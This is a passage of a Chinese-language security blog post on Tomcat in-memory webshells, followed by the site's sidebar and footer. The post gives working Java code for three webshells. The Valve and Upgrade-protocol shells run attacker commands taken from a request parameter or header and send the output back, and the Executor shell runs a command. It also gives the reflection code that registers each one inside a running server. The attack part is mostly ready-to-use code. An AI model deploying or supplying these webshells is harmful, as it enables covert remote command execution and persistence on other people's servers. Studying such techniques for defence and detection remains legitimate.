<p>Pipeline接口提供了各种对Valve的操作方法，可以通过addValve()方法来添加一个Valve<br>在StandardHostValve中可以看到 invoke是获取StandardContext的valve<br>然后再每一个invoke()里面又会递归调用<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692865525658-665889c8-0cd8-4825-b564-20e9da1f2b18.png" alt="image.png"></p>
<p>在Valve的接口中就给了getNext()</p>
<pre><code class="java">public interface Valve &#123;
 
    public Valve getNext();
 
    public void setNext(Valve valve);
 
    public void backgroundProcess();
 
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
 
    public boolean isAsyncSupported();
&#125;
</code></pre>
<p>可以通过getNext()获取下一个valve, 利用getNext().invoke(request, response)往下进行连接</p>
<p>Valve是通过重写invoke方法实现主要逻辑的</p>
<pre><code class="java">class memValve extends ValveBase &#123;
 
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException &#123;
            ...
            &#125;
&#125;
</code></pre>
<p>invoke 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册<br>所以实现内存马步骤如下：</p>
<ol>
<li>写个马</li>
</ol>
<pre><code class="java">class memValve extends ValveBase &#123;

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException &#123;
           String cmd = request.getParameter(&quot;cmd&quot;);
            if (cmd != null)
            &#123;
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader bufferedReader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null)
                &#123;
                    stringBuilder.append(line + &#39;\n&#39;);
                &#125;
                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
                return;
            &#125;
            
            this.getNext().invoke(request, response); //往下连接

        &#125;

    &#125;
</code></pre>
<p>为了不影响后面程序的运行加上<br>this.getNext().invoke(request, response);</p>
<ol start="2">
<li>获取StandardContext</li>
</ol>
<pre><code class="java">Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext stdcontext = (StandardContext) req.getContext();
</code></pre>
<ol start="3">
<li>动态注册</li>
</ol>
<pre><code class="java">stdcontext.getPipeline().addValve(new memValve());
</code></pre>
<p>效果如下：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692866904458-9449aed0-29f3-4dfb-94de-ca379ebbea87.png" alt="image.png"></p>
<h2 id="Executor内存马"><a href="#Executor内存马" class="headerlink" title="Executor内存马"></a>Executor内存马</h2><p>一个Tomcat中是有一个Server，一个Server下有好几个Service，一个Service有多个Connector和一个Container，Connector是负责处理连接相关的事情，Container用于封装和管理Servlet和处理Request请求。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692932925271-a199836f-f035-481b-b063-dc33e1ea247d.png"><br>Connector主要由ProtocolHandler与Adapter构成<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692934101493-58fb97b3-56f3-4848-9576-5bf895df868d.png" alt="image.png"><br>ProtocolHandler 主要由Endpoint和Processor组成<br>Endpoint有五大组件：</p>
<ul>
<li>LimitLatch：连接控制器，负责控制最大的连接数</li>
<li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li>
<li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li>
<li>SocketProcessor：可以看成是一个被封装的任务类</li>
<li><strong>Executor：Tomcat自己扩展的线程池，用来执行任务类</strong></li>
</ul>
<p>Executor是一种可以在Tomcat组件之间进行共享的连接池<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692944869959-22ffaef6-eb0b-4830-b48a-61a66fccc119.png" alt="image.png"><br>在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件( 如Endpoint)会自动创建线程池，此时，线程池不再共享。</p>
<p>在<strong>org.apache.tomcat.util.net.NioEndpoint.Poller</strong>中<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692945570597-626d89ec-f33f-4465-aa3d-213449051cd3.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692945699899-f1c9e4ec-9539-4b29-b5f1-4596738b920b.png" alt="image.png"><br>如果Executor没有，就会调用createExecutor来创建Executor<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692945680610-cdee15ae-dcd0-4735-85ff-93d28c3bb0eb.png" alt="image.png"><br>这里是直接实例化EndPoint自己启动的TreadPoolExecutor类，这个类是Executor的子类</p>
<p>创建后如何使用？<br>在org.apache.tomcat.util.net.NioEndpoint.Poller的run方法中<br>通过调用events方法，来判断是否还有Pollerevent事件，如果有就将其取出，然后把里面的Channel取出来注册到该Selector中，然后不断轮询所有注册过的Channel查看是否有事件发生。当有事件发生时，则调用SocketProcessor交给Executor执行。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692946739094-0fc341af-fac6-4c08-987e-41637abcf179.png" alt="image.png"><br>然后来看processKey方法，processKey()这个方法主要通过调用processSocket()方法创建一个SocketProcessor，然后丢到Tomcat线程池中去执行。每个Endpoint都有自己的SocketProcessor实现，从Endpoint的属性中可以看到，这个Processor也有缓存机制。 总结一下Poller所做的事：遍历PollerEvents队列，将每个事件中的通道感兴趣的事件注册到Selector，当事件就绪时，创建一个SocketProcessor或者从缓存中取出一个SocketProcessor，然后放到线程池执行或者直接执行它的run方法执行。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692947016367-c54629c9-eef0-45fb-abd4-7ad97d76ee16.png" alt="image.png"><br>跟进，来到org.apache.tomcat.util.net.AbstractEndpoint<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692947446891-f5366eea-a986-48b8-abf3-cd5a205fb154.png" alt="image.png"><br>综上，只需要新建一个类继承自TreadPoolExecutor类，然后把恶意的逻辑重写到execute方法即可</p>
<p>那问题来了，如何将新建的类添加到NioEndpoint里，使得this.getExecutor()能够获取到想要的executor<br>在AbstractEndpoint中存在一个setExecutor方法，NioEndpoint继承了AbstractEndpoint，所以只要调用setExecutor就行</p>
<pre><code class="java">public void setExecutor(Executor executor) &#123;
    this.executor = executor;
    this.internalExecutor = executor == null;
&#125;
</code></pre>
<p>新建类，继承ThreadPoolExecutor</p>
<pre><code class="java">public class memThreadExcutor extends ThreadPoolExecutor &#123;

    public memThreadExcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123;
      super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
    &#125;
...
    @Override
    public void execute(Runnable command) &#123;
...
      this.execute(command, 0L, TimeUnit.MILLISECONDS);
    &#125;

  &#125;
</code></pre>
<ol>
<li>写个马</li>
</ol>
<pre><code class="java">public class memThreadExcutor extends ThreadPoolExecutor &#123;

    public memThreadExcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123;
        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
    &#125;
    @Override
    public void execute(Runnable command) &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;calc&quot;);
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
        this.execute(command, 0L, TimeUnit.MILLISECONDS);
    &#125;

&#125;
</code></pre>
<ol start="2">
<li>获取NioEndpoint</li>
</ol>
<pre><code class="java">public Object getNioEndpoint() &#123;
    // 获取当前线程的所有线程
    Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);
    for (Thread thread : threads) &#123;
        try &#123;
            // 需要获取线程的特征包含Acceptor
            if (thread.getName().contains(&quot;Acceptor&quot;)) &#123;
                Object target = getField(thread, &quot;target&quot;);
                Object nioEndpoint = getField(target, &quot;endpoint&quot;);
                return nioEndpoint;
            &#125;
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            continue;
        &#125;
    &#125;
    // 没有获取到对应Endpoint，返回一个空对象
    return new Object();
&#125;
</code></pre>
<p>其中getField是获取对象属性</p>
<pre><code class="java">public Object getField(Object obj, String field) &#123;
    // 递归获取类的及其父类的属性
    Class clazz = obj.getClass();
    while (clazz != Object.class) &#123;
        try &#123;
            Field declaredField = clazz.getDeclaredField(field);
            declaredField.setAccessible(true);
            return declaredField.get(obj);
        &#125; catch (Exception e) &#123;
            clazz = clazz.getSuperclass();
        &#125;
    &#125;
    return null;
&#125;
</code></pre>
<ol start="3">
<li>调用setExecutor完成注册</li>
</ol>
<pre><code class="java">NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();
//获取nioEndpoint
ThreadPoolExecutor executor = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;);
//获取executor用于构造函数传参
memThreadExcutor memthreadexcutor = new memThreadExcutor(executor.getCorePoolSize(), executor.getMaximumPoolSize(), executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(), executor.getThreadFactory(), executor.getRejectedExecutionHandler());
nioEndpoint.setExecutor(memthreadexcutor);//将内存马传入nioEndpoint完成注册
</code></pre>
<p>现在只能够实现执行一条命令，不好利用，是否可以通过resquest和response对象进行实时输入命令执行后进行回显？</p>
<p>可能是这里使用的是tomcat9，在调试的过程中发现和网上的分析文章不一样，获取不到想要的对象，所以回显这里先暂时放一放</p>
<h2 id="Upgrade内存马"><a href="#Upgrade内存马" class="headerlink" title="Upgrade内存马"></a>Upgrade内存马</h2><p>还是看这图<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692934101493-58fb97b3-56f3-4848-9576-5bf895df868d.png" alt="image.png"></p>
<p>前面是利用了EndPoint中的Executor进行构造内存马，这里使用的是Processor<br>在org.apache.coyote.http11.Http11Processor的service方法中，出现了下面的处理过程：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693208222003-d4e9823f-a46b-4c5a-be78-f39eb42f0457.png" alt="image.png"><br>首先调用isConnectionToken()判断request的请求头headers中是否存在Connection: upgrade</p>
<pre><code class="java">private static boolean isConnectionToken(MimeHeaders headers, String token) throws IOException &#123;
    MessageBytes connection = headers.getValue(&quot;Connection&quot;);
    if (connection == null) &#123;
        return false;
    &#125; else &#123;
        Set&lt;String&gt; tokens = new HashSet();
        TokenList.parseTokenList(headers.values(&quot;Connection&quot;), tokens);
        return tokens.contains(token);
    &#125;
&#125;
</code></pre>
<p>如果存在Connection: upgrade则进入判断里面<br>然后再获取headers中Upgrade对应的值，例如 Upgrade：aaa中的aaa<br>往下就调用this.protocol.getUpgradeProtocol()</p>
<pre><code class="java">public UpgradeProtocol getUpgradeProtocol(String upgradedName) &#123;
return (UpgradeProtocol)this.httpUpgradeProtocols.get(upgradedName);
&#125;
</code></pre>
<p>根据请求头Upgrade的值获取相应的 UpgradeProtocol<br>然后在下一个if判断中调用获取到的UpgradeProtocol的accept方法</p>
<p>下一步的目标是找到this.httpUpgradeProtocols是从哪里来的，如果可以动态注册一个UpgradeProtocol,把恶意代码写在accept方法里，内存马不就实现了吗</p>
<p>往上跟踪this.httpUpgradeProtocols ，发现它是一个HashMap对象<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693209904835-59a7fa7b-3cd8-4a2a-829d-3a0c86bdbce9.png" alt="image.png"><br>然后在configureUpgradeProtocol()方法中赋值<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693209966459-a9d5df85-6ba7-4d65-9172-d422f8809e16.png" alt="image.png"></p>
<p>然后发现只有init()方法调用了这个configureUpgradeProtocol()方法<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693210175897-41a8ccd8-6af6-4324-9336-cdc73ea220ad.png" alt="image.png"></p>
<p>在init方法中它做了以下几件事情：</p>
<ol>
<li>通过读取upgradeProtocols列表，</li>
<li>调用configureUpgradeProtocol</li>
<li>将对应upgradeProtocol添加到httpUpgradeProtocols的HashMap中。</li>
</ol>
<p>那是什么时候对upgradeProtocols进行的初始化呢，我们在init方法上下断点，我们发现是在Tomcat启动时进行的初始化。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693210608710-a18b16ad-9e6e-4533-98ba-bbb0b06c14e0.png" alt="image.png"></p>
<p>综上所述，只要获取到AbstractHttp11Protocol对象或者其子类对象，通过反射给属性httpUpgradeProtocols加一个键值对即可<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693213934736-160d7f6e-5188-4a2d-9b58-0b67843dc319.png" alt="image.png"></p>
<ol>
<li>先写个马</li>
</ol>
<p>主要逻辑在accept方法里，这里只接受了一个Request参数，没有Response,不能回显<br>需要获取Response：request对象中存在private Response response;因此我们可以通过反射获取到response对象</p>
<pre><code class="java">public class memUgrade implements UpgradeProtocol &#123;

    @Override
    public String getHttpUpgradeName(boolean b) &#123;
        return null;
    &#125;

    @Override
    public byte[] getAlpnIdentifier() &#123;
        return new byte[0];
    &#125;

    @Override
    public String getAlpnName() &#123;
        return null;
    &#125;

    @Override
    public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) &#123;
        return null;
    &#125;

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, Request request) &#123;
        return null;
    &#125;

    @Override
   public boolean accept(org.apache.coyote.Request request) &#123;
            String p = request.getHeader(&quot;cmd&quot;);
            try &#123;
                String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, p&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, p&#125;;
                org.apache.coyote.Response resp = (org.apache.coyote.Response) getField(request,&quot;response&quot;);
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next().getBytes();
                resp.doWrite(ByteBuffer.wrap(result));
            &#125; catch (Exception e) &#123;
            &#125;
            return false;
        &#125;
&#125;
</code></pre>
<ol start="2">
<li>获取AbstractHttp11Protocol对象或者其子类对象</li>
</ol>
<p>在resquest对象中就能找到Http11NioProtocol<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693214426526-6a87e302-490c-4ec4-a29d-f0fa24b69b48.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693214455503-ff63c482-5ce9-4778-9aeb-fc3605ce28a4.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693214476820-63e600bb-6c36-4975-a66b-d7afb5a067ec.png" alt="image.png"></p>
<p>通过反射获取它</p>
<pre><code class="java">Object req = getField(request,&quot;request&quot;);
Object connector = getField(req,&quot;connector&quot;);
Http11NioProtocol http11NioProtocol = (Http11NioProtocol)getField(connector,&quot;protocolHandler&quot;);
Map&lt;String, UpgradeProtocol&gt; httpUpgradeProtocols = (Map)getField(http11NioProtocol,&quot;httpUpgradeProtocols&quot;);
</code></pre>
<p>其中getField()如下</p>
<pre><code class="java">public Object getField(Object obj, String field) &#123;
    // 递归获取类的及其父类的属性
    Class clazz = obj.getClass();
    while (clazz != Object.class) &#123;
        try &#123;
            Field declaredField = clazz.getDeclaredField(field);
            declaredField.setAccessible(true);
            return declaredField.get(obj);
        &#125; catch (Exception e) &#123;
            clazz = clazz.getSuperclass();
        &#125;
    &#125;
    return null;
&#125;
</code></pre>
<ol start="3">
<li>将恶意的UpgradeProtocol添加到httpUpgradeProtocols里面</li>
</ol>
<pre><code class="java">httpUpgradeProtocols.put(&quot;RunCmd&quot;,new memUpgrade());
</code></pre>
<ol start="4">
<li>结果</li>
</ol>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693227821476-acaa42fb-8db0-4811-857b-281677ef65e8.png" alt="image.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">http://example.com/2023/08/28/Tomcat内存马/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-1p2jl1_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java Agent内存马"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-5g3zl1_1920x1080.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java Agent内存马</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/21/Tomcat%E7%B3%BB%E5%88%97/" title="Tomcat系列"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-l8j592_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tomcat系列</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java Agent内存马"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-5g3zl1_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-04</div><div class="title">Java Agent内存马</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Tomcat内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">Servlet内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">Filter内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Listener内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Valve%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">Valve内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Executor%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.5.</span> <span class="toc-text">Executor内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upgrade%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.</span> <span class="toc-text">Upgrade内存马</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/20/Code-Breaking-Puzzles/" title="Code-Breaking Puzzles"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Code-Breaking Puzzles"/></a><div class="content"><a class="title" href="/2023/10/20/Code-Breaking-Puzzles/" title="Code-Breaking Puzzles">Code-Breaking Puzzles</a><time datetime="2023-10-20T02:41:05.000Z" title="发表于 2023-10-20 10:41:05">2023-10-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="东华杯ezgadget"/></a><div class="content"><a class="title" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget">东华杯ezgadget</a><time datetime="2023-10-19T08:02:57.000Z" title="发表于 2023-10-19 16:02:57">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/15/C3P0/" title="C3P0"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="C3P0"/></a><div class="content"><a class="title" href="/2023/09/15/C3P0/" title="C3P0">C3P0</a><time datetime="2023-09-15T06:40:10.000Z" title="发表于 2023-09-15 14:40:10">2023-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-739d73_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="JDBC反序列化"/></a><div class="content"><a class="title" href="/2023/09/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化">JDBC反序列化</a><time datetime="2023-09-13T02:17:47.000Z" title="发表于 2023-09-13 10:17:47">2023-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-qzmlj5_2560x1600.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsBeanutils反序列化"/></a><div class="content"><a class="title" href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化">CommonsBeanutils反序列化</a><time datetime="2023-09-11T02:10:00.000Z" title="发表于 2023-09-11 10:10:00">2023-09-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
  mermaid.initialize(options);
}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaid.length === 0) return
  const runMermaid = () => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from($mermaid).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const loadMermaid = () => {
    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
  }

  btf.addModeChange('mermaid', runMermaid)

  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>